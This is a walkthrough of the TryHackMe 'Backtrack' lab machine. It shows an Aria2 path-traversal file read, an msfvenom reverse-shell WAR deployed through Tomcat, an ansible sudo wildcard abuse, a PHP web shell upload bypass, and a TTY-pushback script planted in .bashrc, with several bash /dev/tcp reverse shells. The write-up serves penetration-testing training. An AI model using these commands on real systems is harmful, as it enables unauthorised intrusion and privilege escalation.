---
title: CTF Walkthrough for TryHackMe Machine Backtrack
date: 2024-10-17 00:00:00 +0300
categories: [Walkthrough, CTF]
tags: [TryHackMe, Writeup, Tomcat, LFI, Insecure File Upload]   
image:
  path: /assets/img/posts/walthrough/tryhackme/2024-10-17-backtrack/box-backtrack.png
---

## Introduction
Greetings everyone, in this walkthrough, we will talk about Backtrack a TryHackMe machine. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment.
### Machine Description
Name: Backtrack<br>
Difficulty: Medium<br>
Operating System: Linux<br>
Machine link: [Backtrack](https://tryhackme.com/r/room/backtrack)<br>
### Tools used
1) Nmap<br>
2) ffuf<br>
3) Chisel<br>

## Reconnaissance

We will start by performing a port scan on the target to enumerate open ports.
```bash
┌──(pentester㉿kali)-[~/…/Challenge/Backtrack/Scans/Service]
└─$ sudo nmap -n -Pn -sS 10.10.242.37  -oN port-scan.nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-14 10:40 BST
Nmap scan report for 10.10.242.37
Host is up (0.099s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
8888/tcp open  sun-answerbook

Nmap done: 1 IP address (1 host up) scanned in 2.50 seconds
```

With the list of open ports enumerated above, we can perform a service scan to enumerate the names and versions of the services running on these ports.
```bash
┌──(pentester㉿kali)-[~/…/Challenge/Backtrack/Scans/Service]
└─$ nmap -n -Pn -sC -sV 10.10.242.37  -p22,8080,8888 -oN service-scan.nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-14 10:40 BST
Nmap scan report for 10.10.242.37
Host is up (0.30s latency).                                                                                                            
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)                                           
| ssh-hostkey:
|   3072 55:41:5a:65:e3:d8:c2:4f:59:a1:68:b6:79:8a:e3:fb (RSA)
|   256 79:8a:12:64:cc:5c:d2:b7:38:dd:4f:07:76:4f:92:e2 (ECDSA)
|_  256 ce:e2:28:01:5f:0f:6a:77:df:1e:0a:79:df:9a:54:47 (ED25519)
8080/tcp open  http            Apache Tomcat 8.5.93
|_http-title: Apache Tomcat/8.5.93
|_http-favicon: Apache Tomcat
8888/tcp open  sun-answerbook?
| fingerprint-strings:                                             
|   GetRequest, HTTPOptions:
|     HTTP/1.1 200 OK                                              
<SNIP>
SF:0Icons\x20-->\n<svg\x20aria-hidden=\"true\"\x20style=\"position:\x20abs
SF:olute;\x20width:\x200;\x20height:\x200;\x20overflow:\x20hidden;\"\x20ve
SF:rsion=\"1\.1\"\x20xm");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.50 seconds
```

The target runs an SSH server and two web servers where one is Tomcat. Since we don't know the user credentials of Tomcat, let's visit the second web application running on port 8888.
![](/assets/img/posts/walthrough/tryhackme/2024-10-17-backtrack/1-browse.png)

The target seems to run a web-based application known as Aria2 WebUI. We can Google this name to learn more about the application's functionality.
![](/assets/img/posts/walthrough/tryhackme/2024-10-17-backtrack/aria-explained.png)

If we click on Settings -> Server info, we can see the version of Aria2 running on the target.
![](/assets/img/posts/walthrough/tryhackme/2024-10-17-backtrack/aria-version.png)

With the server's version, we can search if any public exploit is available for this specific version. We can see on Github releases  that this version was released in 2019 and that a local file inclusion vulnerability that affects all previous versions was released in 2023. This means the version run by the target is surely vulnerable.
![](/assets/img/posts/walthrough/tryhackme/2024-10-17-backtrack/version-release-data.png)
![](/assets/img/posts/walthrough/tryhackme/2024-10-17-backtrack/poc-proof.png)

Using the POC above POC, we can attempt to exploit the LFI vulnerability.
```bash
┌──(pentester㉿kali)-[~/…/Challenge/Backtrack/Scans/Service]
└─$ curl --path-as-is http://10.10.242.37:8888/../../../../../../../../../../../../../../../../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
<SNIP>
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
<SNIP>
tomcat:x:1002:1002::/opt/tomcat:/bin/false
orville:x:1003:1003::/home/orville:/bin/bash
wilbur:x:1004:1004::/home/wilbur:/bin/bash
```

## Exploitation

The `/etc/passwd` file was included proving that the version run by the target is indeed vulnerable to CVE-2023-39141. Remember that the target runs a Tomcat web server and from the password file we can see the root directory of the Tomcat server. With this information, we can attempt to read the file storing Tomcat users' credentials.
```bash
┌──(pentester㉿kali)-[~/…/Challenge/Backtrack/Scans/Service]
└─$ curl --path-as-is http://10.10.242.37:8888/../../../../../../../../../../../../../../../../../../../../opt/tomcat/conf/tomcat-users.xml
<?xml version="1.0" encoding="UTF-8"?>
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">

  <role rolename="manager-script"/>
  <user username="tomcat" password="<REDACTED>" roles="manager-script"/>

</tomcat-users>
```

The file can be read and we see the user tomcat has the manager-script role in the Tomcat instance. This role gives us access to the tools-friendly plain text interface. We can Tomcat application through this interface. We will first start a listener on our attack host to capture the reverse shell.
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Challenge/Backtrack]
└─$ nc -lvnp 1234                                     
listening on [any] 1234 ...
```

After starting a listener on our attack host, we can use `msfvenom` to generate a malicious `.war` file, deploy it using the `curl`  command, and access the page to execute our reverse shell.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Backtrack/Misc File]
└─$ msfvenom -p  java/shell_reverse_tcp LHOST=10.8.23.19 LPORT=1234 -f war -o shell.war                      
Payload size: 13029 bytes
Final size of war file: 13029 bytes
Saved as: shell.war

┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Backtrack/Misc File]
└─$ curl -v -u tomcat:<REDACTED> --upload-file shell.war  'http://10.10.242.37:8080/manager/text/deploy?path=/myapp&update=true'
*   Trying 10.10.242.37:8080...
* Connected to 10.10.242.37 (10.10.242.37) port 8080
* Server auth using Basic with user 'tomcat'
> PUT /manager/text/deploy?path=/myapp&update=true HTTP/1.1
> Host: 10.10.242.37:8080
> Authorization: Basic dG9tY2F0Ok9QeDUyazUzRDhPa1RacHg0ZnI=
> User-Agent: curl/8.8.0
> Accept: */*
> Content-Length: 13029
> 
* upload completely sent off: 13029 bytes
< HTTP/1.1 200 
< Cache-Control: private
< X-Frame-Options: DENY
< X-Content-Type-Options: nosniff
< Content-Type: text/plain;charset=utf-8
< Transfer-Encoding: chunked
< Date: Mon, 14 Oct 2024 10:40:05 GMT
< 
OK - Deployed application at context path [/myapp]
* Connection #0 to host 10.10.242.37 left intact

┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Backtrack/Misc File]
└─$ curl http://10.10.242.37:8080/myapp 
```

After accessing the malicious page we deployed, we will notice a reverse connection from the target to our listener. We can upgrade this shell to a fully interactive TTY shell to facilitate our enumeration and read the first flag.
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Challenge/Backtrack]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.8.23.19] from (UNKNOWN) [10.10.242.37] 58828
python3 -c 'import pty;pty.spawn("/bin/bash")' 
tomcat@Backtrack:/$ ^Z
zsh: suspended  nc -lvnp 1234

┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Challenge/Backtrack]
└─$ stty raw -echo;fg               
[1]  + continued  nc -lvnp 1234
                               export TERM=xterm
tomcat@Backtrack:/$ cd ~
tomcat@Backtrack:~$ ls
BUILDING.txt     NOTICE         RUNNING.txt  flag1.txt  temp
CONTRIBUTING.md  README.md      bin          lib        webapps
LICENSE          RELEASE-NOTES  conf         logs       work
```

Enumerating tomcat's sudo right reveals that this user can execute the `/usr/bin/ansible-playbook` command on any file having the `.yml` extension in the `/opt/test_playbooks/` directory as wilbur. 
```bash
tomcat@Backtrack:~$ sudo -l
Matching Defaults entries for tomcat on Backtrack:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tomcat may run the following commands on Backtrack:
    (wilbur) NOPASSWD: /usr/bin/ansible-playbook /opt/test_playbooks/*.yml
```

We can google this command to understand its function and how it works.
![](/assets/img/posts/walthrough/tryhackme/2024-10-17-backtrack/ansible-explain.png)

We see that this command is used to automate daily IT tasks hence it might be used to enumerate system commands. After reading through the [tool's online documentation](https://docs.ansible.com/ansible/latest/collections/ansible/builtin/command_module.html) we can write a simple playbook that executes a reverse shell as shown below.
```bash
tomcat@Backtrack:/tmp$ cat myplaybook.yml 
- name: Shell                                        
  hosts: localhost                                                                                                                                        
  gather_facts: no                                                                           
                     
  tasks:                                                                                      
    - name: Shell                                                                   
      command: "bash -c 'bash -i >& /dev/tcp/10.8.23.19/4444 0>&1'" 
tomcat@Backtrack:/tmp$ chmod 755 myplaybook.yml
```

Before executing ansible on the playbook we created, let's start a listener on our attack host.
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Challenge/Backtrack]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```
Now we can execute the playbook we created. This playbook is located in the `tmp` directory. We exploit the `*` wildcard to perform path traversal.
```
tomcat@Backtrack:/tmp$ sudo -u wilbur /usr/bin/ansible-playbook /opt/test_playbooks/../../tmp/myplaybook.yml
[WARNING]: provided hosts list is empty, only localhost is available. Note that
the implicit localhost does not match 'all'
<SNIP>
```

We will notice a reverse connection from the target to our listener. We can upgrade this shell to a fully interactive TTY shell as shown below.
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Challenge/Backtrack]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.23.19] from (UNKNOWN) [10.10.242.37] 36550
wilbur@Backtrack:/tmp$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
wilbur@Backtrack:/tmp$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Challenge/Backtrack]
└─$ stty raw -echo;fg                           
[1]  + continued  nc -lvnp 4444
                               export TERM=xterm
wilbur@Backtrack:/tmp$ 
```

We can notice that Wilbur's home directory contains interesting files. The `from_orville.txt` file indicates that a web application is run locally by another user Orville.
```bash
wilbur@Backtrack:~$ ls -a
.   .ansible       .bashrc            .mysql_history  from_orville.txt
..  .bash_history  .just_in_case.txt  .profile
wilbur@Backtrack:~$ cat .just_in_case.txt 
in case i forget :

wilbur:<REDACTED>
wilbur@Backtrack:~$ cat from_orville.txt 
Hey Wilbur, it's Orville. I just finished developing the image gallery web app I told you about last week, and it works just fine. However, I'd like you to test it yourself to see if everything works and secure.
I've started the app locally so you can access it from here. I've disabled registrations for now because it's still in the testing phase. Here are the credentials you can use to log in:

email : orville@backtrack.thm
password : <REDACTED>
wilbur@Backtrack:~$
```

We can enumerate the port used by this web application using the `netstat` command.
```bash
wilbur@Backtrack:~$ netstat -lnt
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:80            0.0.0.0:*               LISTEN     
<SNIP>   
tcp6       0      0 :::8888 
```

We can perform port forwarding to access the web application running locally on the target. A handy tool to perform this is Chisel. We can transfer Chisel from our attack host to the target using Netcat.
```bash
wilbur@Backtrack:/tmp$ nc -lvnp 4444 > chisel; chmod 755 chisel
Listening on 0.0.0.0 4444
Connection received on 10.8.23.19 54766
```

```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Backtrack/Misc File]
└─$ nc -q 0 10.10.242.37 4444 < /opt/linux-extra/chisel
```

Now that we have Chisel on the target, we can run Chisel's server to listen on a specific port.
```bash
wilbur@Backtrack:/tmp$ ./chisel server -p 5555 
2024/10/14 11:34:33 server: Fingerprint KeYC2+GuZSaKiU7XCUQp/T5/ArqzmYN9GMmp7IJnzck=
2024/10/14 11:34:33 server: Listening on http://0.0.0.0:5555
```

We can use Chisel's client to connect to the server running on the target and perform local port forwarding. This will redirect all traffic sent to our local specified port to the target's specified local port.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Backtrack/Misc File]
└─$ chisel client -v 10.10.242.37:5555 8080:127.0.0.1:80 
2024/10/14 12:49:43 client: Connecting to ws://10.10.242.37:5555
2024/10/14 12:49:43 client: tun: proxy#8080=>80: Listening
2024/10/14 12:49:43 client: tun: Bound proxies
2024/10/14 12:49:43 client: Handshaking...
2024/10/14 12:49:45 client: Sending config
2024/10/14 12:49:45 client: Connected (Latency 307.087458ms)
2024/10/14 12:49:45 client: tun: SSH connected
```

Now that the port forwarding is set, we can access the web application by browsing to our local port 8080.
![](/assets/img/posts/walthrough/tryhackme/2024-10-17-backtrack/local-app.png)

The message in Wilbur's home directory indicated that this web application is an image gallery hence we can think of an insecure file upload vulnerability. Also, the message contained the credentials to log into the application. We can use the credentials above to log into the application.
![](/assets/img/posts/walthrough/tryhackme/2024-10-17-backtrack/login.png)

From the file extension of the login page, we can deduce that the web application uses PHP as its scripting language. With this information, we can create a simple PHP web shell that we will try to upload.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Backtrack/Misc File]
└─$ echo '<?php system($_GET["cmd"]); ?>' > shell.php                   
```

When we try to upload this file as it is, it produces an error message that tells us that the extension is not allowed.
![](/assets/img/posts/walthrough/tryhackme/2024-10-17-backtrack/error-1.png)

We can bypass this by adding a valid image extension before the PHP extension.
![](/assets/img/posts/walthrough/tryhackme/2024-10-17-backtrack/upload-1.png)

The file `shell.png.php` was uploaded successfully but when it is accessed the code is not executed but instead returned as plain text.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Backtrack/Misc File]
└─$ curl http://127.0.0.1:8080/uploads/shell.png.php?cmd=id
<?php system($_GET["cmd"]); ?>  
```

This might be due to some specific server configuration. We can attempt to upload a file in another directory by adding `../` to the file's name. This works successfully after URL encoding `../` twice. 
![](/assets/img/posts/walthrough/tryhackme/2024-10-17-backtrack/upload-success.png)

Once the file is uploaded, we can execute commands on the target as Orville.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Backtrack/Misc File]
└─$ curl http://127.0.0.1:8080/shell.png.php?cmd=id        
uid=1003(orville) gid=1003(orville) groups=1003(orville)
```

We can now start a listener and execute a reverse shell on the target to gain access to the system as Orville.
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Challenge/Backtrack]
└─$ nc -lvnp 2345
listening on [any] 2345 ...
```

```bash
bash -i 'bash -i >& /dev/tcp/10.8.23.19/2345 0>&1'
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Backtrack/Misc File]
└─$ curl http://127.0.0.1:8080/shell.png.php?cmd=bash+-c+%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.8.23.19%2F2345%200%3E%261%22
```

We will notice a reverse connection to our listener and we can upgrade this shell to obtain a fully interactive TTY shell as shown below.
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Challenge/Backtrack]
└─$ nc -lvnp 2345                   
listening on [any] 2345 ...        
connect to [10.8.23.19] from (UNKNOWN) [10.10.242.37] 38170
bash: cannot set terminal process group (590): Inappropriate ioctl for device
bash: no job control in this shell
orville@Backtrack:/var/www/html$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<tml$ python3 -c 'import pty;pty.spawn("/bin/bash")'
orville@Backtrack:/var/www/html$ ^Z
zsh: suspended  nc -lvnp 2345

┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Challenge/Backtrack]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 2345
                               export TERM=xterm
orville@Backtrack:/home/orville$ ls
flag2.txt  web_snapshot.zip
```

## Post Exploitation

We can now enumerate the system using Orville access. We can transfer `pspy64` to the target to enumerate running jobs and cronjobs on the target.
```bash
orville@Backtrack:/tmp$ nc -lvnp 3333 > pspy64;chmod 755 pspy64 
Listening on 0.0.0.0 3333
Connection received on 10.8.23.19 46648
```

```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Backtrack/Misc File]
└─$ nc -q 0 10.10.242.37 3333 < /usr/share/pspy/pspy64
```

Now that we have `pspy64` we can run it.
```bash
orville@Backtrack:/tmp$ ./pspy64 
<SNIP>
2024/10/14 14:20:03 CMD: UID=0     PID=41634  | sshd: root@pts/3     
2024/10/14 14:20:03 CMD: UID=0     PID=41635  | -bash 
2024/10/14 14:20:03 CMD: UID=0     PID=41636  | -bash 
2024/10/14 14:20:03 CMD: UID=0     PID=41638  | -bash 
2024/10/14 14:20:03 CMD: UID=0     PID=41637  | -bash 
2024/10/14 14:20:03 CMD: UID=0     PID=41639  | -bash 
2024/10/14 14:20:03 CMD: UID=0     PID=41640  | /bin/sh /usr/bin/lesspipe 
2024/10/14 14:20:03 CMD: UID=0     PID=41642  | /bin/sh /usr/bin/lesspipe 
2024/10/14 14:20:03 CMD: UID=0     PID=41641  | /bin/sh /usr/bin/lesspipe 
2024/10/14 14:20:03 CMD: UID=0     PID=41645  | su - orville 
2024/10/14 14:20:03 CMD: UID=1003  PID=41646  | su - orville 
2024/10/14 14:20:03 CMD: UID=1003  PID=41647  | -bash 
2024/10/14 14:20:03 CMD: UID=1003  PID=41648  | -bash 
2024/10/14 14:20:03 CMD: UID=1003  PID=41650  | -bash 
2024/10/14 14:20:03 CMD: UID=1003  PID=41649  | -bash 
2024/10/14 14:20:03 CMD: UID=1003  PID=41651  | -bash 
2024/10/14 14:20:04 CMD: UID=1003  PID=41652  | /bin/sh /usr/bin/lesspipe 
2024/10/14 14:20:04 CMD: UID=1003  PID=41654  | /bin/sh /usr/bin/lesspipe 
2024/10/14 14:20:04 CMD: UID=1003  PID=41653  | /bin/sh /usr/bin/lesspipe 
2024/10/14 14:20:04 CMD: UID=1003  PID=41655  | -bash 
2024/10/14 14:20:06 CMD: UID=1003  PID=41656  | zip -q -r /home/orville/web_snapshot.zip /var/www/html/css /var/www/html/dashboard.php /var/www/html/includes /var/www/html/index.php /var/www/html/login.php /var/www/html/logout.php /var/www/html/navbar.php /var/www/html/register.php /var/www/html/shell.png.php /var/www/html/uploads 
2024/10/14 14:20:11 CMD: UID=1003  PID=41658  | 
<SNIP>
```

We will notice that the root user SSH to the system runs `su - orville` to impersonate Orville and perform a zip operation. The `su` command was used without the `-P` option indicating that no pseudo-terminal was created and Orville shares a terminal with the original session (root session). This might be vulnerable to the [TTY Pushback](https://www.errno.fr/TTYPushback.html) attack. We can use the Python script below that will kill Orville's session created by the root user and inject commands in the root shell.  
```python
#!/usr/bin/env python3
import fcntl
import termios
import os
import sys
import signal

os.kill(os.getppid(), signal.SIGSTOP)

for char in sys.argv[1] + '\n':
    fcntl.ioctl(0, termios.TIOCSTI, char)
```

For this script to run automatically when the root user impersonates Orville we need to add that will run this script in Orville's `.bashrc` file. The `.bashrc` file is a script file that's executed when a user logs in. We can give it a reverse shell as an argument that will be executed as root.
```bash
orville@Backtrack:/home/orville$ nano shell.py
orville@Backtrack:/home/orville$ echo "python3 shell.py \"bash -c 'bash -i >& /dev/tcp/10.8.23.19/4444 0>&1'\"" >> .bashrc
```

With this, we can start our listener on our attack host and wait for the connection.
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Challenge/Backtrack]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
```

After a while, we will receive a shell as root and we can use this to read the final flag. 
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Challenge/Backtrack]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [10.8.23.19] from (UNKNOWN) [10.10.242.37] 52046
root@Backtrack:~# ls
flag3.txt
manage.py
snap
```

## Conclusion

Congratulations! In this walkthrough, you have exploited an LFI vulnerability to read the credentials of the Tomcat user that you use to obtain a shell on the target. Finally, you exploited a file upload vulnerability to move laterally and exploited the TTY Puchback vulnerability to obtain root on the target. This machine was designed to show how inconsistent input validation when accepting uploads, poor patching practices, and wrong usage of system commands could seriously impact an organisation's security posture. Thanks for following up on this walkthrough.
